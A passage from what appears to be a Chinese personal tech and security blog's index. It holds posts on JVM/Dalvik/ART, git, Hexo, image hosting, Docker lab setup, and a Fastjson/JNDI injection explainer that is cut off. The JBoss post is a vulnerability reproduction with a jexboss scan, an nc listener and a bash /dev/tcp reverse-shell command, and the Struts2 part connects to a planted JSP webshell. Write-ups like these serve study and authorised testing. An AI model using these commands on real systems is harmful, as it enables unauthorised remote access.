href="http://192.168.116.128:8080/shell.jsp">http://192.168.116.128:8080/shell.jsp</a></p><p>用哥斯拉直接连接</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226135051039.png" alt="image-20210226135051039"></p><h2 id="删除环境"><a href="#删除环境" class="headerlink" title="删除环境"></a>删除环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure><h2 id="宿主机访问docker"><a href="#宿主机访问docker" class="headerlink" title="宿主机访问docker"></a>宿主机访问docker</h2><p>虽然本地主机可以访问虚拟机的ip，但是内部docker是单独的ip，查看ip</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226140234413.png" alt="image-20210226140234413"></p><p>虽然不知道为什么有两个，但是这两个都可以在kali内访问成功</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226140354000.png" alt="image-20210226140354000"></p><p>而在宿主机上却失败</p><p>解决方法如下：</p><p>1、<strong>查看docker容器内系统ip</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226140624667.png" alt="image-20210226140624667"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker inspect 90a7bce2cbd8   # 容器id</span><br></pre></td></tr></table></figure><p>显示容器内系统ip</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226140739500.png" alt="image-20210226140739500"></p><p>172.18.0.2也是可以访问的</p><p>2、<strong>配置虚拟机ip</strong></p><p>保证宿主机Windows10和我的kali虚拟机在同一个网段</p><ul><li>如果是桥接模式，不用修改</li><li>NAT模式，作如下配置</li></ul><p>修改NAT模式下vmnet8的NAT IP,配置和win10在同一网段</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226141255564.png" alt="image-20210226141255564"></p><p>改为1段（不用点DHCP设置，直接修改左下角的子网ip）</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226141136412.png" alt="image-20210226141136412"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226141513471.png" alt="image-20210226141513471"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226141542667.png" alt="image-20210226141542667"></p><p>service networking restart，再查看ip，虚拟机ip已经由之前的192.168.116.128变成了192.168.1.128</p><p>说明win10与虚拟机在同一网段了</p><p>3、<strong>添加宿主机到docker的路由</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ROUTE add 172.18.0.0 mask 255.255.0.0 192.168.1.2   # 网管默认192.168.1.2</span><br><span class="line">ROUTE add 172.17.0.0 mask 255.255.0.0 192.168.1.2</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226142115932.png" alt="image-20210226142115932"></p><p>配置完成后，可以在win10上访问 </p><p>这样在同时运行多个容器的时候，就可以通过容器IP地址和端口使用了！</p><blockquote><p>你看这NAT模式这么麻烦，一开始直接桥接模式不香吗，而且NAT我按照操作修改后win10还是无法正常访问，我吐了</p><p>改为桥接后，还是不行，kali本身都访问不了172.18.0.2了。。我吐了。有大佬知道原因吗，求解答<img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/25538244.gif" alt="img">5</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_36711453/article/details/84999632">https://blog.csdn.net/qq_36711453/article/details/84999632</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> docker </tag>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JVM、Dalvik、ART</title>
      <link href="2023/11/28/JVM%E3%80%81Dalvik%E3%80%81ART/"/>
      <url>2023/11/28/JVM%E3%80%81Dalvik%E3%80%81ART/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h2><p>JVM本质上就是一个软件，是计算机硬件的一层软件抽象，在这之上才能够运行Java程序，JAVA在编译后会生成类似于汇编语言的.class字节码文件，与C语言编译后产生的汇编语言不同的是，C编译成的汇编语言会直接在硬件上跑，但JAVA编译后生成的.class字节码是在JVM上跑，需要由JVM把字节码翻译成机器指令，才能使JAVA程序跑起来，更确切的说是能够与底层沟通。<br>    JVM运行在操作系统上，屏蔽了底层实现的差异，从而有了JAVA平台独立性和Write Once Run Anywhere。</p><p>根据JVM规范实现的具体虚拟机有几十种，主流的JVM包括Hotspot、Jikes RVM等，都是用C/C++和汇编编写的，每个JRE编译的时候针对每个平台编译，因此下载JRE（JVM、Java核心类库和支持文件）的时候是分平台的，JVM的作用是把平台无关的.class里面的字节码翻译成平台相关的机器码，来实现跨平台。</p><h2 id="Dalvik"><a href="#Dalvik" class="headerlink" title="Dalvik"></a>Dalvik</h2><p>Android 运行环境主要指的Dalvik虚拟机技术，也就是安卓虚拟机DVM。每个Android应用进程对应着一个独立的Dalvik虚拟机实例并在其解释下执行。<strong>Dalvik虚拟机使用的是寄存器架构而不是JVM中常见的栈架构。</strong> Dalvik没有遵循Java虚拟机规范，不能直接执行Java的.class文件，而是执行.dex文件。其中.dex（Dalvik Executable）文件是通过.class文件转化而来，安卓使用Java语法编写应用程序，可以直接使用大部分的Java API等。</p><blockquote><ol><li>JVM 基于栈，Dalvik 基于寄存器。</li><li>Java虚拟机运行java字节码，Dalvik虚拟机运行的是其专有的文件格式Dex。</li></ol></blockquote><p>基于寄存器的虚拟机虽然比基于堆栈的虚拟机在硬件通用性上要差一些，但是它的代码执行效率却更好，DVM可以根据硬件实现更大的优化，这更适合移动设备的特点。</p><h2 id="Art"><a href="#Art" class="headerlink" title="Art"></a>Art</h2><ul><li>ART(Android Runtime），Android 4.4发布，用来替换Dalvik虚拟机。Android 4.4之前默认采用的还是DVM，系统会提供一个选项来开启ART模式。在Android 5.0时，默认采用ART，DVM从此退出历史舞台。</li></ul><p>在Dalvik下，应用每次运行都需要通过<code>即时编译器（JIT，Just In Time）</code>将字节码转换为机器码，即每次都要编译加运行，这一机制并不高效，但让应用安装比较快，而且更容易在不同硬件和架构上运行。</p><p>ART完全改变了这种做法，在应用安装时就预编译字节码到机器码，这个过程叫做<code>预编译（AOT,Ahead-Of-Time）</code>，使其成为真正的本地应用，应用程序执行将更有效率，启动更快。</p><blockquote><p>Dalvik每次都要编译再运行，这就导致需要不断的CPU计算，卡，慢，续航差。</p><p>ART优点：</p><p>① 系统性能显著提升</p><p>② 应用启动更快、运行更快、体验更流畅、触感反馈更及时</p><p>③ 续航能力提升</p><p>④ 支持更低的硬件</p><p>ART缺点</p><p>① 更大的存储空间占用，可能增加10%-20%（空间换时间大法）</p><p>② 更长的应用安装时间</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JBoss漏洞</title>
      <link href="2023/11/28/jboss%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2023/11/28/jboss%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h4 id="JBoss-5-x-6-x-CVE-2017-12149-反序列化漏洞"><a href="#JBoss-5-x-6-x-CVE-2017-12149-反序列化漏洞" class="headerlink" title="JBoss 5.x/6.x CVE-2017-12149 反序列化漏洞"></a>JBoss 5.x/6.x CVE-2017-12149 反序列化漏洞</h4><blockquote><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。<br>该漏洞出现在**/invoker/readonly**请求中，服务器将用户提交的POST内容进行了Java反序列化,导致传入的携带恶意代码的序列化数据执行。</p></blockquote><p>影响版本</p><ul><li>JbossAS 5.x</li><li>JbossAS 6.x</li></ul><p>漏洞验证</p><p>http://目标:8002/invoker/readonly 如果出现报 500 错误,则说明目标机器可能存在此漏洞</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201214135738927.png" alt="image-20201214135738927"></p><p>虽然显示了500错误，但是查看版本发现还是没有CVE-2017-12149 反序列化漏洞的</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201214135611698.png" alt="image-20201214135611698"></p><p>也可以用工具检验</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201214140112222.png" alt="image-20201214140112222"></p><p>也是不存在漏洞的。</p><h4 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h4><p>如果/jmx-console/存在下面这样可以直接访问的情况，极大情况是存在漏洞的</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201214230859007.png" alt="image-20201214230859007"></p><p>工具检测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jexboss.py -u http:&#x2F;&#x2F;ip:8002</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201214143633943.png" alt="image-20201214143633943"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201214150041161.png" alt="image-20201214150041161"></p><p>管理员用户，Windows操作系统</p><p>开始反弹shell</p><p><code>公网监听</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 8989</span><br></pre></td></tr></table></figure><p><code>反弹shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Shell&gt;jexremote&#x3D;公网ip:8989</span><br><span class="line">Shell&gt;&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F;8989 0&gt;&amp;1 2&gt;&amp;1 </span><br></pre></td></tr></table></figure><p>这里用了第一种方法才成功了</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201214230304235.png" alt="image-20201214230304235"></p><p>好家伙，反弹成功</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201214230227173.png" alt="image-20201214230227173"></p><p>后面就不再继续了，提交src平台，做个守法的好公民x.x</p>]]></content>
      
      
      
        <tags>
            
            <tag> 中间件 </tag>
            
            <tag> JBoss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>justCTF2020 writeup</title>
      <link href="2023/11/28/justCTF2020%20writeup/"/>
      <url>2023/11/28/justCTF2020%20writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>位置：<a href="https://2020.justctf.team/">https://2020.justctf.team/</a></p><h2 id="忘记的名字"><a href="#忘记的名字" class="headerlink" title="忘记的名字"></a>忘记的名字</h2><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201155039439.png" alt="image-20210201155039439"></p><p>搜索证书透明性日志<a href="https://crt.sh/?q=jctf.pro">https://crt.sh/?q=jctf.pro</a></p><p>获取6a开头的一串子域名</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201155217964.png" alt="image-20210201155217964"></p><h3 id="xdd解码"><a href="#xdd解码" class="headerlink" title="xdd解码"></a>xdd解码</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210201154935448.png" alt="image-20210201154935448"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git回溯到上一次commit</title>
      <link href="2023/11/28/git%E5%9B%9E%E6%BA%AF%E5%88%B0%E4%B8%8A%E4%B8%80%E6%AC%A1commit/"/>
      <url>2023/11/28/git%E5%9B%9E%E6%BA%AF%E5%88%B0%E4%B8%8A%E4%B8%80%E6%AC%A1commit/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在找博客内容的时候，总感觉少了点什么，还好有一个链接指向，打开发现我之前写的东西怎么不见了！！去GitHub的提交历史记录看，确实在最新一次的commit上，那一篇被误删掉了，现在要把之前的文章找回来，只能回溯到上一次commit，然后再提交到仓库中</p><h2 id="回溯过程"><a href="#回溯过程" class="headerlink" title="回溯过程"></a>回溯过程</h2><p>在有.git的文件目录下打开git bash</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128112821255.png" alt="image-20210128112821255"></p><p>输入命令查看log 也可以直接在GitHub上查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128112923540.png" alt="image-20210128112923540"></p><p>这里是回去过后的截图了，要回到指定的commit，需要如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard [commit]</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128113035028.png" alt="image-20210128113035028"></p><p>此时HEAD已经是ddcf79a了，那么就要git push传到仓库</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128113152318.png" alt="image-20210128113152318"></p><p>发现出错了，为什么，百度一下是没有远程仓库，解决方法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">git add --all</span><br><span class="line">git commit -m &quot;上传&quot;</span><br><span class="line">git remote add origin https:&#x2F;&#x2F;github.com&#x2F;dummersoul&#x2F;dummersoul.github.io</span><br><span class="line">git push -f orgin main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后下一次就不用那么麻烦了，直接：</span><br><span class="line">$ git add --all</span><br><span class="line">$ git commit -m &quot;信息&quot;</span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128113345348.png" alt="image-20210128113345348"></p><p>因为现在github默认的分支是main,所以是 origin main,原来默认master</p><p>总之意思是把上传到远程仓库的origin分支再传到自己的分支去</p><p>这样再去GitHub上查看，原来最新的历史提交记录就消失了，只留在了我们指定位置这里。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、<a href="https://blog.csdn.net/qq_32963841/article/details/107077179">https://blog.csdn.net/qq_32963841/article/details/107077179</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客优化篇之搜索功能</title>
      <link href="2023/11/28/hexo%E5%8D%9A%E5%AE%A2%E4%BC%98%E5%8C%96%E7%AF%87%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/"/>
      <url>2023/11/28/hexo%E5%8D%9A%E5%AE%A2%E4%BC%98%E5%8C%96%E7%AF%87%E4%B9%8B%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>终于要继续打造我的博客了，今天就上手添加个搜索功能，找东西更方便，说干就干！</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>由于插件搜索功能是调用hexo-generator-search生成xml数据，所以先安装插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><h2 id="配置主题文件"><a href="#配置主题文件" class="headerlink" title="配置主题文件"></a>配置主题文件</h2><p>打开本地搜索功能</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224120240608.png" alt="image-20210224120240608"></p><h2 id="修改站点配置文件"><a href="#修改站点配置文件" class="headerlink" title="修改站点配置文件"></a>修改站点配置文件</h2><p>添加搜索功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224133058601.png" alt="image-20210224133058601"></p><h2 id="清理缓存"><a href="#清理缓存" class="headerlink" title="清理缓存"></a>清理缓存</h2><p>配置好之后一定要 <code>hexo clean</code> 才能实现正常功能，不然搜索会跑到最下面</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224133830093.png" alt="image-20210224133830093"></p><p>hexo clean 过后效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224134406898.png" alt="image-20210224134406898"></p><p>搜索反应会有点慢，等一会才能搜索到东西</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub图床图片失效怎么修复</title>
      <link href="2023/11/28/GitHub%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E5%A4%B1%E6%95%88%E6%80%8E%E4%B9%88%E4%BF%AE%E5%A4%8D/"/>
      <url>2023/11/28/GitHub%E5%9B%BE%E5%BA%8A%E5%9B%BE%E7%89%87%E5%A4%B1%E6%95%88%E6%80%8E%E4%B9%88%E4%BF%AE%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>打开博客发现所有的之前的图片都失效了，这是为什么？<br>点击GitHub上的仓库时发现图片的地址raw.githubusercontent.com无法连接</p><p>百度了一下如何解决这个问题</p><h5 id="1、查询ip"><a href="#1、查询ip" class="headerlink" title="1、查询ip"></a>1、查询ip</h5><p>在<a href="https://site.ip138.com/">https://site.ip138.com/</a> 或者<a href="https://www.ipaddress.com/">https://www.ipaddress.com/</a> 输入raw.githubusercontent.com，查询IP地址</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201220181200033.png" alt="image-20201220181200033"></p><p>我的第一个是151.101.108.133</p><h5 id="2、修改host文件"><a href="#2、修改host文件" class="headerlink" title="2、修改host文件"></a>2、修改host文件</h5><p>windows:</p><p>用管理员权限编辑 C:\Windows\System32\drivers\etc\hosts 文件</p><p>修改hosts Ubuntu，CentOS及macOS直接在终端输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>添加以下内容保存即可 （IP地址查询后相应修改，可以ping不同IP的延时 选择最佳IP地址）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># GitHub Start</span><br><span class="line">52.74.223.119     github.com</span><br><span class="line">192.30.253.119    gist.github.com</span><br><span class="line">54.169.195.247    api.github.com</span><br><span class="line">185.199.111.153   assets-cdn.github.com</span><br><span class="line">151.101.76.133   raw.githubusercontent.com</span><br><span class="line">151.101.108.133   user-images.githubusercontent.com</span><br><span class="line">151.101.76.133    gist.githubusercontent.com</span><br><span class="line">151.101.76.133    cloud.githubusercontent.com</span><br><span class="line">151.101.76.133    camo.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars0.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars1.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars2.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars3.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars4.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars5.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars6.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars7.githubusercontent.com</span><br><span class="line">151.101.76.133    avatars8.githubusercontent.com</span><br><span class="line"># GitHub End</span><br></pre></td></tr></table></figure><p>这样图片就可以正常访问了。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://blog.csdn.net/u014671962/article/details/106493368">https://blog.csdn.net/u014671962/article/details/106493368</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub+PicGo+Typora搭建免费图床</title>
      <link href="2023/11/28/GitHub+PicGo%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"/>
      <url>2023/11/28/GitHub+PicGo%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>由于每次makedown上传的图片都会显示不出来，网上的图床也很多 要么付费要么有限制，还是搭建在自己家比较安心</p><h1 id="二、下载PicGo"><a href="#二、下载PicGo" class="headerlink" title="二、下载PicGo"></a>二、下载PicGo</h1><p><a href="https://github.com/Molunerfinn/PicGo/releases">PicGo下载</a></p><ul><li>Windows系统下载<code>exe</code>文件，macOS系统下载<code>dmg</code>文件，Linux下载<code>AppImage</code>文件</li></ul><h1 id="三、创建仓库和密钥"><a href="#三、创建仓库和密钥" class="headerlink" title="三、创建仓库和密钥"></a>三、创建仓库和密钥</h1><p>GitHub上新建一个存储库</p><p>创建仓库填写一些说明性文字</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203150145001.png" alt="image-20201203150145001"></p><p>直接访问<code>https://github.com/settings/tokens</code>， 点击<code>Generate new token</code>按照下图配置创建即可，所有的勾勾都√上</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203150103244.png" alt="image-20201203150103244"></p><p>点击“创建”，就会生成一个密钥，记得<strong>保存</strong>！</p><h1 id="四、配置PIcGo"><a href="#四、配置PIcGo" class="headerlink" title="四、配置PIcGo"></a>四、配置PIcGo</h1><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203154219335.png" alt="image-20201203154219335"></p><h1 id="五、配置Typora"><a href="#五、配置Typora" class="headerlink" title="五、配置Typora"></a>五、配置Typora</h1><p>打开文件——偏好设置——图像，设置路径</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20201203154459925.png" alt="image-20201203154459925"></p><p>然后点击验证图片上传测试一下，这样每次复制过来的图片都会自动上传到图床中去，就是会慢一点</p><h1 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h1><p><a href="https://juejin.cn/post/6844904137407086600">https://juejin.cn/post/6844904137407086600</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson反序列化漏洞分析与利用</title>
      <link href="2023/11/28/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2023/11/28/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h2><h3 id="Java序列化-amp-反序列化"><a href="#Java序列化-amp-反序列化" class="headerlink" title="Java序列化&amp;反序列化"></a>Java序列化&amp;反序列化</h3><ul><li>Java序列化：把Java对象转换为字节序列的过程。</li><li>Java反序列化：把字节序列恢复为Java对象的过程。</li></ul><h3 id="为什么要用序列化呢？"><a href="#为什么要用序列化呢？" class="headerlink" title="为什么要用序列化呢？"></a>为什么要用序列化呢？</h3><p>网络传输只能通过字节流，不能直接传输对象。</p><p>进行通信时，发送方需要把这个Java对象转换为字节序列，然后在网络上传送； 接收方需要从字节序列中恢复出Java对象。</p><ul><li><p>实现了数据的持久化，通过序列化可以把数据永久地保存</p></li><li><p>利用序列化实现远程通信</p></li></ul><blockquote><p>反序列化常用的JNDI注入有两种利用方式，一种是基于rmi，一种是基于ldap。RMI指的是JAVA的远程方法调用，LDAP是轻量级目录访问协议。</p></blockquote><h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>JNDI (Java Naming and Directory Interface) 是一组应用程序接口。</p><p>比如，如果lookup方法的参数是可以控制的，就可以将其参数指向我们控制的RMI服务，切换到我们控制的RMI/LDAP服务。</p><blockquote><p>JNDI是一台交换机，将组件、资源、服务取了名字，再通过名字来查找</p></blockquote><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>RMI 允许像在本机上一样操作远程机器上的对象。当发送消息给远程对象和调用远程方法时，需要用到序列化机制来发送和接收返回值。 </p><p>由此可见，使用 RMI 时会涉及到参数传递和结果返回，参数为对象时，要求对象可以被序列化。</p><h4 id="RMI远程调用步骤"><a href="#RMI远程调用步骤" class="headerlink" title="RMI远程调用步骤"></a>RMI远程调用步骤</h4><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20220818095049.png" alt="image-20211103161803457"></p><p>从客户端角度看，服务端应用是有两个端口的，一个是RMI Registry端口，另一个是远程对象的通信端口。</p><p>RMI Registry可以和Server端在一台服务器上，也可以在不同的服务器上，不过大多数时候在同一台服务器上且运行在同一JVM环境下。</p><h3 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h3><p>将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行。</p><h2 id="jdk关键版本"><a href="#jdk关键版本" class="headerlink" title="jdk关键版本"></a>jdk关键版本</h2><blockquote><p>基于rmi的利用方式：</p><p>适用jdk版本：JDK 6u141, JDK 7u131, JDK 8u121之前。 </p><p>在jdk8u122的时候，加入了反序列化白名单的机制，关闭了rmi远程加载代码。 </p><p>基于ldap的利用方式：</p><p>适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。 </p><p>在Java 